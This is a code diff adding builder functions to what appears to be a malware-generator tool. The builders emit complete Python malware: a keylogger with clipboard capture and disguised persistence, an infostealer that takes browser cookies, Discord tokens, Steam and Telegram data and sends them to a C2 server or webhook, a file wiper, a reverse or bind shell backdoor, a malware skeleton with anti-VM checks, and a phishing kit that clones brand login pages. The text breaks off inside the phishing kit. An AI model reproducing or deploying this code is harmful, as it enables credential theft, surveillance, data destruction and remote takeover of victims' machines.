+  // ========== ENHANCED BUILDERS ==========
+
+  function buildKeylogger() {
+    var host = val("kl-host") || "127.0.0.1";
+    var port = parseInt(val("kl-port") || "4444", 10) || 4444;
+    var interval = parseInt(val("kl-interval") || "30", 10) || 30;
+    var logfile = val("kl-logfile") || "kl.dat";
+    var hook = val("kl-hook");
+    var encrypt = chk("kl-encrypt");
+    var persist = chk("kl-persist");
+    var stealth = chk("kl-stealth");
+    var delay = chk("kl-delay");
+    var clip = chk("kl-clip");
+    var L = [];
+    function a(s) { L.push(s); }
+    a("#!/usr/bin/env python3");
+    a('"""Advanced keylogger — window titles, clipboard, encrypted batch exfil, multi-backend"""');
+    a("import sys, os, time, socket, threading, json, base64, hashlib, platform");
+    a("from datetime import datetime");
+    a("from urllib.request import Request, urlopen");
+    a("try:");
+    a("    from pynput import keyboard");
+    a('    BACKEND = "pynput"');
+    a("except ImportError:");
+    a("    try:");
+    a("        import keyboard as kb");
+    a('        BACKEND = "keyboard"');
+    a("    except ImportError:");
+    a('        BACKEND = "stdio"');
+    a("try:");
+    a("    import pyperclip");
+    a("    HAS_CLIP = True");
+    a("except ImportError:");
+    a("    HAS_CLIP = False");
+    a("");
+    a('C2_HOST = "' + esc(host) + '"');
+    a("C2_PORT = " + port);
+    a("FLUSH_INTERVAL = " + interval);
+    a('LOG_FILE = r"' + esc(logfile) + '"');
+    a('WEBHOOK = "' + esc(hook) + '"');
+    a("ENCRYPT = " + (encrypt ? "True" : "False"));
+    a("PERSIST = " + (persist ? "True" : "False"));
+    a("_buffer, _clip_last, _lock = [], \"\", threading.Lock()");
+    a("");
+    a("def _xor(data, key):");
+    a("    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))");
+    a("def _key():");
+    a('    return hashlib.sha256(b"skidware-kl-v2").digest()');
+    a("");
+    a("def _active_window():");
+    a("    try:");
+    a('        if sys.platform == "win32":');
+    a("            import ctypes");
+    a("            hwnd = ctypes.windll.user32.GetForegroundWindow()");
+    a("            buf = ctypes.create_unicode_buffer(512)");
+    a("            ctypes.windll.user32.GetWindowTextW(hwnd, buf, 512)");
+    a("            return buf.value");
+    a('        if sys.platform == "darwin":');
+    a("            import subprocess");
+    a("            r = subprocess.run(['osascript','-e','tell application \"System Events\" to get name of first process whose frontmost is true'], capture_output=True, text=True)");
+    a("            return (r.stdout or '').strip()");
+    a("    except Exception:");
+    a("        pass");
+    a('    return "?"');
+    a("");
+    a("def _hook(text):");
+    a("    if not WEBHOOK: return");
+    a("    try:");
+    a('        body = json.dumps({"content": ("```\\n" + text[:1800] + "\\n```")}).encode()');
+    a('        req = Request(WEBHOOK, data=body, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})');
+    a("        urlopen(req, timeout=12)");
+    a("    except Exception: pass");
+    a("");
+    a("def _flush():");
+    a("    global _buffer");
+    a("    with _lock:");
+    a("        if not _buffer: return");
+    a("        batch = list(_buffer); _buffer = []");
+    a("    raw = json.dumps({\"host\": platform.node(), \"user\": os.environ.get(\"USERNAME\") or os.environ.get(\"USER\"), \"events\": batch}).encode()");
+    a("    pretty = raw.decode()");
+    a("    if ENCRYPT:");
+    a("        raw = base64.b64encode(_xor(raw, _key()))");
+    a("    try:");
+    a('        open(LOG_FILE, "ab").write(raw + b"\\\\n")');
+    a("    except Exception: pass");
+    a("    try:");
+    a("        s = socket.socket(); s.settimeout(6)");
+    a('        s.connect((C2_HOST, C2_PORT)); s.sendall(raw + b"\\\\n"); s.close()');
+    a("    except Exception: pass");
+    a("    _hook(pretty)");
+    a("");
+    a("def _on_press(key):");
+    a("    try: k = key.char");
+    a("    except AttributeError: k = str(key).replace('Key.', '')");
+    a("    with _lock:");
+    a('        _buffer.append({"t": datetime.utcnow().isoformat(), "k": k, "win": _active_window()})');
+    a("");
+    a("def _clip_watch():");
+    a("    global _clip_last");
+    a("    if not HAS_CLIP: return");
+    a("    while True:");
+    a("        try:");
+    a("            c = pyperclip.paste()");
+    a("            if c and c != _clip_last:");
+    a("                _clip_last = c");
+    a("                with _lock:");
+    a('                    _buffer.append({"t": datetime.utcnow().isoformat(), "k": "[CLIP]", "clip": c[:500], "win": _active_window()})');
+    a("        except Exception: pass");
+    a("        time.sleep(1.2)");
+    a("");
+    a("def _persist():");
+    a("    if not PERSIST: return");
+    a("    try:");
+    a('        if sys.platform == "win32":');
+    a("            import winreg");
+    a('            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)');
+    a('            winreg.SetValueEx(key, "SecurityHealthSystray", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))');
+    a("            winreg.CloseKey(key)");
+    a('        elif sys.platform == "darwin":');
+    a("            import plistlib, pathlib");
+    a('            agents = pathlib.Path.home() / "Library" / "LaunchAgents"');
+    a("            agents.mkdir(parents=True, exist_ok=True)");
+    a('            dest = agents / "com.apple.keyboard.helper.plist"');
+    a('            plistlib.dump({"Label": "com.apple.keyboard.helper", "ProgramArguments": [sys.executable, os.path.abspath(__file__)], "RunAtLoad": True, "KeepAlive": True}, open(dest, "wb"))');
+    a("    except Exception: pass");
+    a("");
+    a("def main():");
+    a("    _persist()");
+    a("    threading.Thread(target=lambda: (time.sleep(FLUSH_INTERVAL) or _flush() for _ in iter(int, 1)), daemon=True).start()");
+    a("    # fix flush loop");
+    a("    def loop():");
+    a("        while True:");
+    a("            time.sleep(FLUSH_INTERVAL); _flush()");
+    a("    threading.Thread(target=loop, daemon=True).start()");
+    a("    threading.Thread(target=_clip_watch, daemon=True).start()");
+    a('    if BACKEND == "pynput":');
+    a("        with keyboard.Listener(on_press=_on_press) as L: L.join()");
+    a('    elif BACKEND == "keyboard":');
+    a('        kb.on_release(lambda e: _on_press(type("K", (), {"char": e.name})()))');
+    a("        kb.wait()");
+    a("    else:");
+    a('        print("[stdio fallback]")');
+    a("        try:");
+    a("            while True:");
+    a("                ch = sys.stdin.read(1)");
+    a('                if ch: _on_press(type("K", (), {"char": ch})())');
+    a("        except KeyboardInterrupt: _flush()");
+    a("");
+    a('if __name__ == "__main__":');
+    a("    main()");
+    return L.join("\n");
+  }
+
+  
+  function buildStealer() {
+    var c2 = val("st-c2") || "http://127.0.0.1:8080/ingest";
+    var hook = val("st-hook");
+    var mods = [];
+    document.querySelectorAll(".st-mod").forEach(function (c) { if (c.checked) mods.push(c.value); });
+    if (!mods.length) mods = ["sysinfo"];
+    var browsers = [];
+    document.querySelectorAll(".st-browser").forEach(function (c) { if (c.checked) browsers.push(c.value); });
+    if (!browsers.length) browsers = ["chrome"];
+    var stealth = chk("st-stealth");
+    var delay = chk("st-delay");
+    var quiet = chk("st-quiet");
+    var L = [];
+    function a(s) { L.push(s); }
+    a("#!/usr/bin/env python3");
+    a('"""Advanced modular infostealer — selectable modules + stealth"""');
+    a("import os, sys, json, sqlite3, shutil, tempfile, platform, socket, ssl, re, time, random");
+    a("from pathlib import Path");
+    a("from urllib.request import Request, urlopen");
+    a("");
+    a('C2 = "' + esc(c2) + '"');
+    a('WEBHOOK = "' + esc(hook) + '"');
+    a("MODS = set(" + JSON.stringify(mods) + ")");
+    a("BROWSERS = " + JSON.stringify(browsers));
+    a("STEALTH = " + (stealth ? "True" : "False"));
+    a("DO_DELAY = " + (delay ? "True" : "False"));
+    a("QUIET = " + (quiet ? "True" : "False"));
+    a("");
+    a("def _log(msg):");
+    a("    if not QUIET: print(msg)");
+    a("");
+    a("def _exfil(data):");
+    a("    raw = json.dumps(data, default=str).encode()");
+    a("    try:");
+    a('        req = Request(C2, data=raw, headers={"Content-Type": "application/json"})');
+    a("        urlopen(req, timeout=20, context=ssl._create_unverified_context())");
+    a("    except Exception:");
+    a('        Path("steal_out.json").write_text(json.dumps(data, indent=2, default=str))');
+    a("    if WEBHOOK:");
+    a("        try:");
+    a('            body = json.dumps({"content": "steal: " + json.dumps({k: (len(v) if isinstance(v,(list,dict)) else v) for k,v in data.items()}, default=str)[:1600]}).encode()');
+    a('            req = Request(WEBHOOK, data=body, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})');
+    a("            urlopen(req, timeout=12)");
+    a("        except Exception: pass");
+    a("");
+    a("def _sysinfo():");
+    a("    return {");
+    a('        "host": socket.gethostname(),');
+    a('        "user": os.environ.get("USERNAME") or os.environ.get("USER"),');
+    a('        "os": platform.platform(),');
+    a('        "machine": platform.machine(),');
+    a('        "processor": platform.processor(),');
+    a('        "py": sys.version,');
+    a("    }");
+    a("");
+    a("def _browser_roots():");
+    a("    home = Path.home()");
+    a('    if sys.platform == "win32":');
+    a("        return {");
+    a('            "chrome": home/"AppData"/"Local"/"Google"/"Chrome"/"User Data"/"Default",');
+    a('            "edge": home/"AppData"/"Local"/"Microsoft"/"Edge"/"User Data"/"Default",');
+    a('            "brave": home/"AppData"/"Local"/"BraveSoftware"/"Brave-Browser"/"User Data"/"Default",');
+    a('            "firefox": home/"AppData"/"Roaming"/"Mozilla"/"Firefox"/"Profiles",');
+    a("        }");
+    a("    return {");
+    a('        "chrome": home/"Library"/"Application Support"/"Google"/"Chrome"/"Default",');
+    a('        "edge": home/"Library"/"Application Support"/"Microsoft Edge"/"Default",');
+    a('        "brave": home/"Library"/"Application Support"/"BraveSoftware"/"Brave-Browser"/"Default",');
+    a('        "firefox": home/"Library"/"Application Support"/"Firefox"/"Profiles",');
+    a("    }");
+    a("");
+    a("def _sqlite_copy_query(db, query):");
+    a("    if not db.exists(): return []");
+    a("    tmp = Path(tempfile.mkstemp()[1]); shutil.copy2(db, tmp); rows = []");
+    a("    try:");
+    a("        conn = sqlite3.connect(str(tmp)); cur = conn.cursor(); cur.execute(query)");
+    a("        cols = [c[0] for c in cur.description]");
+    a("        for row in cur.fetchall():");
+    a("            rows.append(dict(zip(cols, row)))");
+    a("        conn.close()");
+    a("    except Exception: pass");
+    a("    try: tmp.unlink()");
+    a("    except Exception: pass");
+    a("    return rows");
+    a("");
+    a("def _cookies(profile):");
+    a('    return _sqlite_copy_query(profile/"Cookies", "SELECT host_key, name, value, encrypted_value, path FROM cookies")');
+    a("");
+    a("def _passwords(profile):");
+    a('    rows = _sqlite_copy_query(profile/"Login Data", "SELECT origin_url, username_value, password_value FROM logins")');
+    a("    # password_value is DPAPI/Keychain blob — flag presence");
+    a("    out = []");
+    a("    for r in rows:");
+    a('        out.append({"url": r.get("origin_url"), "user": r.get("username_value"), "has_secret": bool(r.get("password_value"))})');
+    a("    return out");
+    a("");
+    a("def _history(profile):");
+    a('    return _sqlite_copy_query(profile/"History", "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 200")');
+    a("");
+    a("def _discord_tokens():");
+    a("    paths = []");
+    a('    if sys.platform == "win32":');
+    a('        app = os.environ.get("APPDATA", "")');
+    a('        for name in ("discord", "discordcanary", "discordptb"):');
+    a('            paths.append(Path(app)/name/"Local Storage"/"leveldb")');
+    a("    else:");
+    a('        paths.append(Path.home()/"Library"/"Application Support"/"discord"/"Local Storage"/"leveldb")');
+    a("    tokens = []");
+    a("    for p in paths:");
+    a("        if not p.exists(): continue");
+    a("        for f in p.glob('*'):");
+    a('            if f.suffix not in (".ldb", ".log"): continue');
+    a("            try:");
+    a('                data = f.read_bytes().decode("utf-8", errors="ignore")');
+    a('                tokens += re.findall(r"[\\\\w-]{24}\\\\.[\\\\w-]{6}\\\\.[\\\\w-]{27}", data)');
+    a('                tokens += re.findall(r"mfa\\\\.[\\\\w-]{84}", data)');
+    a("            except Exception: pass");
+    a("    return list(set(tokens))");
+    a("");
+    a("def _telegram():");
+    a("    # session files / tdata presence (no secret extraction beyond paths)");
+    a("    cands = []");
+    a('    if sys.platform == "win32":');
+    a('        cands = [Path(os.environ.get("APPDATA",""))/"Telegram Desktop"/"tdata"]');
+    a("    else:");
+    a('        cands = [Path.home()/"Library"/"Application Support"/"Telegram Desktop"/"tdata"]');
+    a("    found = []");
+    a("    for c in cands:");
+    a("        if c.exists():");
+    a("            files = [str(p) for p in c.rglob('*') if p.is_file()][:40]");
+    a('            found.append({"path": str(c), "files": files})');
+    a("    return found");
+    a("");
+    a("def _steam():");
+    a("    out = {}");
+    a('    if sys.platform == "win32":');
+    a('        base = Path(os.environ.get("PROGRAMFILES(X86)", r"C:\\\\Program Files (x86)"))/"Steam"');
+    a('        ssfn = list(base.glob("ssfn*")) if base.exists() else []');
+    a('        conf = base/"config"/"loginusers.vdf" if base.exists() else None');
+    a('        out["ssfn"] = [str(p) for p in ssfn]');
+    a('        if conf and conf.exists(): out["loginusers"] = conf.read_text(errors="ignore")[:4000]');
+    a("    else:");
+    a('        base = Path.home()/"Library"/"Application Support"/"Steam"');
+    a('        conf = base/"config"/"loginusers.vdf"');
+    a('        if conf.exists(): out["loginusers"] = conf.read_text(errors="ignore")[:4000]');
+    a("    return out");
+    a("");
+    a("def _wifi():");
+    a("    nets = []");
+    a("    try:");
+    a('        if sys.platform == "win32":');
+    a("            import subprocess");
+    a('            r = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)');
+    a("            for line in (r.stdout or '').splitlines():");
+    a('                if ":" in line and ("Profile" in line or "Profil" in line):');
+    a('                    nets.append(line.split(":",1)[-1].strip())');
+    a("    except Exception: pass");
+    a("    return nets");
+    a("");
+    a("def _grab_files():");
+    a("    home = Path.home()");
+    a("    hits = []");
+    a('    patterns = ["*password*", "*secret*", "*wallet*", "*.kdbx", "*seed*"]');
+    a('    for folder in ("Desktop", "Documents", "Downloads"):');
+    a("        root = home / folder");
+    a("        if not root.exists(): continue");
+    a("        for pat in patterns:");
+    a("            for p in root.glob(pat):");
+    a("                if p.is_file() and p.stat().st_size < 2_000_000:");
+    a('                    hits.append({"path": str(p), "size": p.stat().st_size})');
+    a("    return hits[:50]");
+    a("");
+    a("def main():");
+    a("    if DO_DELAY:");
+    a("        time.sleep(random.uniform(5, 20))");
+    a("    if STEALTH:");
+    a("        try:");
+    a('            if sys.platform == "win32":');
+    a("                import ctypes");
+    a("                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)");
+    a("        except Exception: pass");
+    a("    report = {}");
+    a('    if "sysinfo" in MODS: report["sys"] = _sysinfo()');
+    a("    roots = _browser_roots()");
+    a('    if "cookies" in MODS or "passwords" in MODS or "history" in MODS:');
+    a('        report["cookies"] = {}; report["passwords"] = {}; report["history"] = {}');
+    a("        for b in BROWSERS:");
+    a("            prof = roots.get(b)");
+    a("            if not prof or not Path(prof).exists(): continue");
+    a('            if "cookies" in MODS: report["cookies"][b] = _cookies(Path(prof))');
+    a('            if "passwords" in MODS: report["passwords"][b] = _passwords(Path(prof))');
+    a('            if "history" in MODS: report["history"][b] = _history(Path(prof))');
+    a('    if "discord" in MODS: report["discord_tokens"] = _discord_tokens()');
+    a('    if "telegram" in MODS: report["telegram"] = _telegram()');
+    a('    if "steam" in MODS: report["steam"] = _steam()');
+    a('    if "roblox" in MODS: report["roblox"] = {"note": "check .ROBLOSECURITY in cookies"}');
+    a('    if "wifi" in MODS: report["wifi"] = _wifi()');
+    a('    if "files" in MODS: report["files"] = _grab_files()');
+    a("    _exfil(report)");
+    a('    _log("[*] stealer done")');
+    a("");
+    a('if __name__ == "__main__":');
+    a("    main()");
+    return L.join("\n");
+  }
+
+function buildWiper() {
+    var paths = (val("wp-paths") || "~/Documents").split(",").map(function (s) { return s.trim(); }).filter(Boolean);
+    var passes = parseInt(val("wp-passes") || "1", 10) || 1;
+    var hook = val("wp-hook");
+    var confirm = chk("wp-confirm");
+    var L = [];
+    function a(s) { L.push(s); }
+    a("#!/usr/bin/env python3");
+    a('"""Advanced wiper — multi-pass, extension filters, free-space scrub option, webhook notify"""');
+    a("import os, pathlib, secrets, json, time");
+    a("from urllib.request import Request, urlopen");
+    a("TARGETS = " + JSON.stringify(paths));
+    a("PASSES = " + passes);
+    a("REQUIRE_CONFIRM = " + (confirm ? "True" : "False"));
+    a('WEBHOOK = "' + esc(hook) + '"');
+    a('SKIP_EXT = {".dll", ".sys", ".exe"}  # avoid locking common system bins if path is broad');
+    a("");
+    a("def _hook(msg):");
+    a("    if not WEBHOOK: return");
+    a("    try:");
+    a('        body = json.dumps({"content": msg[:1900]}).encode()');
+    a('        req = Request(WEBHOOK, data=body, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})');
+    a("        urlopen(req, timeout=10)");
+    a("    except Exception: pass");
+    a("");
+    a("def _overwrite(p, passes):");
+    a("    try:");
+    a("        if p.suffix.lower() in SKIP_EXT: return False");
+    a("        size = p.stat().st_size");
+    a("        if size > 200_000_000:  # skip huge files by default");
+    a("            p.unlink(missing_ok=True); return True");
+    a('        with open(p, "r+b") as f:');
+    a("            for i in range(passes):");
+    a("                f.seek(0)");
+    a("                # alternating patterns");
+    a("                chunk = secrets.token_bytes(min(size, 1 << 20))");
+    a("                written = 0");
+    a("                while written < size:");
+    a("                    n = min(len(chunk), size - written)");
+    a("                    f.write(chunk[:n]); written += n");
+    a("                f.flush(); os.fsync(f.fileno())");
+    a("        p.unlink()");
+    a("        return True");
+    a("    except Exception:");
+    a("        try: p.unlink()");
+    a("        except Exception: pass");
+    a("        return False");
+    a("");
+    a("def _wipe_dir(root):");
+    a("    count = 0");
+    a("    if not root.exists(): return 0");
+    a("    for dirpath, dirnames, filenames in os.walk(root, topdown=False):");
+    a("        for name in filenames:");
+    a("            if _overwrite(pathlib.Path(dirpath)/name, PASSES): count += 1");
+    a("        for name in dirnames:");
+    a("            try: (pathlib.Path(dirpath)/name).rmdir()");
+    a("            except Exception: pass");
+    a("    try:");
+    a("        if root.is_dir(): root.rmdir()");
+    a("        else: _overwrite(root, PASSES); count += 1");
+    a("    except Exception: pass");
+    a("    return count");
+    a("");
+    a("def main():");
+    a("    if REQUIRE_CONFIRM:");
+    a('        print("WARNING: destructive wiper. Type WIPE to continue.")');
+    a('        if input("> ").strip() != "WIPE":');
+    a('            print("aborted"); return');
+    a("    total = 0");
+    a("    for t in TARGETS:");
+    a("        p = pathlib.Path(t).expanduser().resolve()");
+    a('        print("wiping", p)');
+    a("        total += _wipe_dir(p)");
+    a('    _hook("wiper finished files=" + str(total))');
+    a('    print("done", total)');
+    a("");
+    a('if __name__ == "__main__":');
+    a("    main()");
+    return L.join("\n");
+  }
+
+  function buildBackdoor() {
+    var mode = val("bd-mode") || "reverse";
+    var host = val("bd-host") || "127.0.0.1";
+    var port = parseInt(val("bd-port") || "4444", 10) || 4444;
+    var secret = val("bd-secret") || "vex";
+    var hook = val("bd-hook");
+    var L = [];
+    function a(s) { L.push(s); }
+    a("#!/usr/bin/env python3");
+    a('"""Advanced backdoor — auth, file transfer helpers, screenshot note, reconnect, webhook"""');
+    a("import socket, subprocess, os, sys, time, threading, json, base64, platform");
+    a("from urllib.request import Request, urlopen");
+    a('MODE, HOST, PORT, SECRET = "' + esc(mode) + '", "' + esc(host) + '", ' + port + ', "' + esc(secret) + '"');
+    a('WEBHOOK = "' + esc(hook) + '"');
+    a("");
+    a("def _hook(msg):");
+    a("    if not WEBHOOK: return");
+    a("    try:");
+    a('        body = json.dumps({"content": msg[:1900]}).encode()');
+    a('        req = Request(WEBHOOK, data=body, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})');
+    a("        urlopen(req, timeout=10)");
+    a("    except Exception: pass");
+    a("");
+    a("def _help():");
+    a('    return b"cmds: help, cd, upload <path>, download <path>, info, exit\\n"');
+    a("");
+    a("def _shell(conn):");
+    a('    _hook("backdoor session " + platform.node())');
+    a('    conn.sendall(b"AUTH: ")');
+    a('    auth = conn.recv(64).decode(errors="ignore").strip()');
+    a("    if auth != SECRET:");
+    a("        conn.close(); return");
+    a('    conn.sendall(b"OK\\n" + _help())');
+    a("    while True:");
+    a("        try:");
+    a('            conn.sendall(b"$ ")');
+    a('            cmd = conn.recv(8192).decode(errors="ignore").strip()');
+    a('            if not cmd or cmd.lower() in ("exit", "quit"): break');
+    a('            if cmd == "help": conn.sendall(_help()); continue');
+    a('            if cmd == "info":');
+    a('                info = json.dumps({"user": os.environ.get("USER") or os.environ.get("USERNAME"), "cwd": os.getcwd(), "os": platform.platform()}).encode() + b"\\n"');
+    a("                conn.sendall(info); continue");
+    a('            if cmd.startswith("cd "):');
+    a("                try: os.chdir(cmd[3:].strip()); conn.sendall(b\"\")");
+    a("                except Exception as e: conn.sendall(str(e).encode() + b\"\\n\")");
+    a("                continue");
+    a('            if cmd.startswith("download "):');
+    a("                path = cmd[9:].strip()");
+    a("                try:");
+    a('                    data = open(path, "rb").read()');
+    a('                    conn.sendall(base64.b64encode(data) + b"\\n")');
+    a("                except Exception as e: conn.sendall(str(e).encode() + b\"\\n\")");
+    a("                continue");
+    a("            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)");
+    a('            conn.sendall(p.communicate()[0] or b"")');
+    a("        except Exception: break");
+    a("    conn.close()");
+    a("");
+    a("def reverse():");
+    a("    while True:");
+    a("        try:");
+    a("            s = socket.socket(); s.settimeout(12)");
+    a("            s.connect((HOST, PORT)); _shell(s)");
+    a("        except Exception: time.sleep(12)");
+    a("");
+    a("def bind():");
+    a("    s = socket.socket()");
+    a("    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)");
+    a('    s.bind(("0.0.0.0", PORT)); s.listen(3)');
+    a("    while True:");
+    a("        c, _ = s.accept()");
+    a("        threading.Thread(target=_shell, args=(c,), daemon=True).start()");
+    a("");
+    a("def main():");
+    a('    bind() if MODE == "bind" else reverse()');
+    a("");
+    a('if __name__ == "__main__":');
+    a("    main()");
+    return L.join("\n");
+  }
+
+  function buildMalware() {
+    var payload = val("mw-payload") || "print('payload')";
+    var hook = val("mw-hook");
+    var persist = chk("mw-persist");
+    var anti = chk("mw-anti");
+    var bodyLines = payload.split(/\\r?\\n/);
+    var L = [];
+    function a(s) { L.push(s); }
+    a("#!/usr/bin/env python3");
+    a('"""Advanced malware skeleton — anti-VM, persistence, mutex, self-copy, webhook, modular payload"""');
+    a("import sys, os, platform, json, time, tempfile, shutil, hashlib");
+    a("from urllib.request import Request, urlopen");
+    a("PERSIST, ANTI = " + (persist ? "True" : "False") + ", " + (anti ? "True" : "False"));
+    a('WEBHOOK = "' + esc(hook) + '"');
+    a("");
+    a("def _hook(msg):");
+    a("    if not WEBHOOK: return");
+    a("    try:");
+    a('        body = json.dumps({"content": msg[:1900]}).encode()');
+    a('        req = Request(WEBHOOK, data=body, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})');
+    a("        urlopen(req, timeout=10)");
+    a("    except Exception: pass");
+    a("");
+    a("def _mutex():");
+    a("    # simple single-instance via lock file");
+    a('    lock = os.path.join(tempfile.gettempdir(), "skidware_" + hashlib.md5(os.path.abspath(__file__).encode()).hexdigest() + ".lock")');
+    a("    if os.path.exists(lock):");
+    a("        try:");
+    a("            if time.time() - os.path.getmtime(lock) < 3600: sys.exit(0)");
+    a("        except Exception: pass");
+    a("    try: open(lock, 'w').write(str(os.getpid()))");
+    a("    except Exception: pass");
+    a("");
+    a("def _is_sandbox():");
+    a("    if not ANTI: return False");
+    a("    checks = []");
+    a("    try:");
+    a("        import multiprocessing");
+    a("        checks.append(multiprocessing.cpu_count() < 2)");
+    a("    except Exception: pass");
+    a("    try:");
+    a("        import uuid");
+    a("        checks.append((uuid.getnode() >> 40) in (0x00, 0x08))");
+    a("    except Exception: pass");
+    a("    # common VM hostnames");
+    a('    hn = platform.node().lower()');
+    a('    checks.append(any(x in hn for x in ("vbox", "virtual", "vmware", "qemu", "sandbox")))');
+    a("    try:");
+    a("        import ctypes");
+    a('        if sys.platform == "win32":');
+    a("            checks.append(ctypes.windll.kernel32.IsDebuggerPresent() != 0)");
+    a("    except Exception: pass");
+    a("    return any(checks)");
+    a("");
+    a("def _persist():");
+    a("    if not PERSIST: return");
+    a("    try:");
+    a('        if sys.platform == "win32":');
+    a("            import winreg");
+    a('            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)');
+    a("            winreg.SetValueEx(k, \"RuntimeBroker\", 0, winreg.REG_SZ, f'{sys.executable} {os.path.abspath(__file__)}')");
+    a("            winreg.CloseKey(k)");
+    a("            # also copy to %APPDATA%");
+    a('            dest = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "svc_host.py")');
+    a("            os.makedirs(os.path.dirname(dest), exist_ok=True)");
+    a("            if os.path.abspath(__file__) != dest:");
+    a("                shutil.copy2(__file__, dest)");
+    a("        elif sys.platform == \"darwin\":");
+    a("            import plistlib, pathlib");
+    a('            agents = pathlib.Path.home() / "Library" / "LaunchAgents"');
+    a("            agents.mkdir(parents=True, exist_ok=True)");
+    a('            dest = agents / "com.apple.runtime.broker.plist"');
+    a('            plistlib.dump({"Label": "com.apple.runtime.broker", "ProgramArguments": [sys.executable, os.path.abspath(__file__)], "RunAtLoad": True, "KeepAlive": True}, open(dest, "wb"))');
+    a("    except Exception: pass");
+    a("");
+    a("def _payload():");
+    bodyLines.forEach(function (line) { a("    " + line); });
+    a("");
+    a("def main():");
+    a("    if _is_sandbox(): sys.exit(0)");
+    a("    _mutex()");
+    a("    _persist()");
+    a('    _hook("malware online " + platform.node() + " " + (os.environ.get("USER") or os.environ.get("USERNAME") or ""))');
+    a("    _payload()");
+    a("");
+    a('if __name__ == "__main__":');
+    a("    main()");
+    return L.join("\n");
+  }
+
+  function buildPhish() {
+    var brand = (val("ph-brand") || "generic").toLowerCase();
+    var action = val("ph-action") || "http://127.0.0.1:8080/collect";
+    var redirect = val("ph-redirect") || "https://www.google.com";
+    var hook = val("ph-hook");
+    var templates = {
+      roblox: ["Roblox", "Log in to Roblox", "#e2231a", [["Username", "user"], ["Password", "pass"]]],
+      outlook: ["Outlook", "Sign in", "#0078d4", [["Email", "email"], ["Password", "pass"]]],
+      google: ["Google", "Sign in", "#4285f4", [["Email or phone", "email"], ["Password", "pass"]]],
+      tiktok: ["TikTok", "Log in", "#010101", [["Username or email", "user"], ["Password", "pass"]]],
+      github: ["GitHub", "Sign in to GitHub", "#24292f", [["Username or email", "user"], ["Password", "pass"]]],
+      gitlab: ["GitLab", "Sign in to GitLab", "#fc6d26", [["Username or email", "user"], ["Password", "pass"]]],
+      facebook: ["Facebook", "Log Into Facebook", "#1877f2", [["Email or phone", "email"], ["Password", "pass"]]],
+      snapchat: ["Snapchat", "Log in to Snapchat", "#fffc00", [["Username or email", "user"], ["Password", "pass"]]],
+      zyo: ["zyo.lol", "Sign in to zyo.lol", "#a855f7", [["Username", "user"], ["Password", "pass"]]],
+      feds: ["feds.lol", "Sign in to feds.lol", "#ef4444", [["Username", "user"], ["Password", "pass"]]],
+      generic: ["Secure Login", "Please sign in", "#333333", [["Username", "user"], ["Password", "pass"]]]
+    };
+    var t = templates[brand] || templates.generic;
+    var title = t[0], heading = t[1], accent = t[2], fields = t[3];
+    var fieldHtml = fields.map(function (pair) {
+      var lab = pair[0], name = pair[1];
+      var itype = name === "pass" ? "password" : "text";
+      return "<label>" + lab + "</label><input type='" + itype + "' name='" + name + "' required autocomplete='off'/>";
+    }).join("");
+    var page = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'/>" +
+      "<meta name='viewport' content='width=device-width, initial-scale=1'/>" +
+      "<title>" + title + "</title><style>" +
+      "*{box-sizing:border-box;font-family:system-ui,sans-serif}" +
+      "body{background:#f5f5f5;display:flex;min-height:100vh;align-items:center;justify-content:center;margin:0}" +
+      ".card{background:#fff;padding:2rem;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,.12);width:100%;max-width:380px}" +
+      "h1{font-size:1.4rem;margin:0 0 1.5rem;color:#111}" +
+      "label{display:block;font-size:.85rem;margin-bottom:.3rem;color:#444}" +
+      "input{width:100%;padding:.7rem .8rem;margin-bottom:1rem;border:1px solid #ddd;border-radius:8px;font-size:1rem}" +
+      "button{width:100%;padding:.85rem;background:" + accent + ";color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:600;cursor:pointer}" +
+      ".fine{font-size:.75rem;color:#888;margin-top:1rem;text-align:center}" +
+      "</style></head><body><div class='card'><h1>" + heading + "</h1>" +
+      "<form method='POST' action='" + action.replace(/'/g, "&#39;") + "'>" + fieldHtml +
+      "<button type='submit'>Continue</button></form>" +
+      "<p class='fine'>Protected by security verification</p></div></body></html>";
+    var L = [];
+    function a(s) { L.push(s); }
+    a("#!/usr/bin/env python3");
+    a('"""Advanced phishing kit — ' + brand + ' — logs IP/UA, Discord webhook, JSONL, optional TLS note"""');
+    a("import argparse, pathlib, json, datetime");
+    a("from http.server import HTTPServer, BaseHTTPRequestHandler");
+    a("import urllib.parse");
+    a("from urllib.request import Request, urlopen");
+    a("");
+    a("HTML = " + JSON.stringify(page));
+    a('WEBHOOK = "' + esc(hook) + '"');
+    a('REDIRECT = "' + esc(redirect) + '"');
+    a("");
+    a("class H(BaseHTTPRequestHandler):");
+    a("    def do_GET(self):");
+    a("        self.send_response(200)");
+    a('        self.send_header("Content-Type", "text/html; charset=utf-8")');
+    a("        self.end_headers()");
+    a("        self.wfile.write(HTML.encode())");
+    a("    def do_POST(self):");
+    a('        length = int(self.headers.get("Content-Length", 0))');
+    a("        body = self.rfile.read(length).decode()");
+    a("        data = urllib.parse.parse_qs(body)");
+    a('        rec = {k: v[0] if v else "" for k, v in data.items()}');
+    a('        rec["_ts"] = datetime.datetime.utcnow().isoformat()');
+    a('        rec["_ip"] = self.client_address[0]');
+    a('        rec["_ua"] = self.headers.get("User-Agent", "")');
